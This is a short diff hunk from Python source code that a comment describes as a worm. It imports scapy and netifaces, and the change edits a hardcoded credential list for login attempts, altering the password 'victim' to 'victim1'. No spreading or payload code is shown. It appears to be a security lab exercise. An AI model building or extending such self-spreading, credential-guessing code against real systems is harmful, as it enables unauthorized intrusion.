@@ -9,9 +9,8 @@ import netifaces
 import random
 from scapy.all import *
 
-# The list of credentials to attempt
 credList = [
-	('victim', 'victim')
+	('victim', 'victim1')
 ]
 
 # The file marking whether the worm should spread
